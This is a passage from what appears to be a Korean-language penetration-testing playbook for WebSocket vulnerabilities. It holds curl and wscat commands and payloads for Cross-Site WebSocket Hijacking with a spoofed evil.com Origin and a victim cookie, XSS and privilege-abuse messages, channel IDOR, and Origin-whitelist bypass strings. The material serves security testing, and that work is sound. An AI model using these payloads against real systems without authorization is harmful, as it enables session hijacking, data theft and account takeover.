### Phase 2: 동적 테스트 (검증)

**정찰 페이로드:**

**WebSocket endpoint 발견:**
```bash
# 일반적인 경로 후보
for path in "/ws" "/socket" "/websocket" "/ws/v1" "/api/ws" "/socket.io" "/cable" "/stream" "/realtime"; do
  curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
    -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    "https://target${path}" 2>&1 | grep "^HTTP"
done

# Socket.IO transport=polling fallback
curl "https://target/socket.io/?EIO=4&transport=polling"

# Rails ActionCable
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "https://target/cable"

# SignalR negotiate
curl "https://target/signalr/negotiate"
curl "https://target/hub/negotiate"
```

**클라이언트 코드에서 WebSocket URL 추출:**
- HTML 응답에 `new WebSocket('wss://...')` 패턴 grep
- bundle.js 안 `io('wss://...')` 패턴
- Source map에서 (sourcemap-scanner 결합)

**Subprotocol enumeration:**
```bash
# 어떤 subprotocol 지원하는지
for proto in "graphql-ws" "graphql-transport-ws" "stomp" "amqp" "mqtt"; do
  curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
    -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Protocol: $proto" \
    "https://target/ws" 2>&1 | grep -i "Sec-WebSocket-Protocol"
done
```

---

**기본 페이로드:**

**CSWSH (외부 Origin + 피해자 쿠키)** (`CSWSH` 라벨):
```
GET /ws HTTP/1.1
Host: target
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://evil.com
Cookie: session=VICTIM_SESSION
```

```bash
curl -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=VICTIM_SESSION" \
  "https://target/ws"
# 101 Switching Protocols → CSWSH 확인
```

**Socket.IO polling fallback:**
```bash
curl "https://target/socket.io/?EIO=4&transport=polling" \
  -H "Origin: https://evil.com" -H "Cookie: session=VICTIM"
```

**핸드셰이크 인증 누락** (`LATE_AUTH` 라벨):
```bash
# 인증 정보 없이 연결
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "https://target/ws"
```

**메시지 인젝션 (wscat/websocat):**
```bash
wscat -c "wss://target/ws" -H "Cookie: session=USER"
```
페이로드:
- `{"type":"chat","message":"<img src=x onerror=alert(1)>"}` (broadcast XSS)
- `{"type":"admin_action","action":"delete_user","userId":"123"}` (권한 미체크)
- `{"type":"subscribe","channel":"/user/OTHER_ID/notifications"}` (CHANNEL_IDOR)
- `{"type":"send","to":"victim","message":"x"}` (인가 없는 메시지 발송)

**Subprotocol 변조:**
```bash
curl -H "Sec-WebSocket-Protocol: admin-protocol, default" ...
# Sec-WebSocket-Protocol에 admin 권한 protocol 시도
```

**JWT 만료 후 connection 유지:**
```bash
# 1. 짧은 TTL JWT로 연결
wscat -c "wss://target/ws?token=SHORT_TTL_JWT"
# 2. TTL 초과 후 메시지 송신 — 거부되지 않으면 LATE_AUTH
```

**Origin 변형:**
- `Origin: null` (sandbox iframe)
- `Origin: https://target.evil.com` (substring match 우회)
- `Origin: https://evil.com#https://target.com` (fragment trick)

**SignalR fallback (long polling/SSE):**
```bash
# WebSocket 차단 시 fallback
curl "https://target/signalr/connect?transport=longPolling&clientProtocol=2.0" \
  -H "Origin: https://evil.com"
```

---

**우회 페이로드:**

| 방어 | 페이로드 |
|---|---|
| Origin 화이트리스트 substring | `https://allowed.com.attacker.com`, `https://allowed.com@attacker.com`, `https://attacker.com#allowed.com` |
| `null` Origin 허용 (file 호환) | `<iframe sandbox>` 안에서 WebSocket 연결 — Origin: null 우회 |
| 핸드셰이크 인증만 + 연결 유지 | 세션/토큰 만료 후 메시지 송신 — 재검증 없으면 통과 |
| Rate limit per connection | 여러 connection 동시 — per user/IP 필요 |
| 채널 owner 검증 (핸드셰이크 시) | 검증 후 다른 channel ID로 메시지 송신 — 메시지 단계 cross-check 누락 |
| Cookie 인증 차단 (Bearer만) | WebSocket은 query string으로 token 전달 — `wss://target/ws?token=X` 노출 |
| HTTPS 강제 | 일부 환경 ws:// fallback 잔존 |

**Compression attack (CRIME 변형):**
- permessage-deflate 활성 + 피해자 데이터 예측 공격 (드물지만 가능)

---

**참고사항:**

- `ws` 라이브러리 기본 — `verifyClient` 미설정 시 모든 origin 허용 (Node)
- Socket.IO 4.x `cors.origin: '*'` 또는 미명시는 cross-origin 허용
- 핸드셰이크 token을 query string으로 전달하면 로그/Referer/proxy 노출
- JWT 만료 후 connection 유지하는 패턴이 가장 흔함 (1시간 TTL인데 6시간 통신)
- broadcast 전 sanitize 누락이 stored XSS로 직결 (xss-scanner와 결합)
- 채널 구독 시 owner 검증 누락은 IDOR 변형 — 다른 사용자 알림/메시지 도청 (idor-scanner 결합)
- 평문 ws://는 인증 토큰 노출 — wss:// 강제 점검
- gRPC over WebSocket, GraphQL over WebSocket (graphql-ws)도 동일 문제
- DPoP 같은 token binding 적용 시 탈취 토큰 단독 사용 차단
- Sec-WebSocket-Protocol 변조로 admin protocol 강제 시도 가능
- Origin: null은 일부 file:// 환경 또는 sandbox iframe 시뮬레이션
- WebSocket frame smuggling은 fragmented frame 악용 — 메시지 경계 혼동
- broadcast 메시지가 모든 구독자에게 전달되면 stored XSS 영향도 가장 큼 — 다른 사용자 세션에서 트리거
- 검증 시 multi-account 필수 — 1차 계정 broadcast → 2차 계정 수신 확인
- WebSocket handshake에 SameSite 쿠키가 적용되는지 확인 — 브라우저 의존
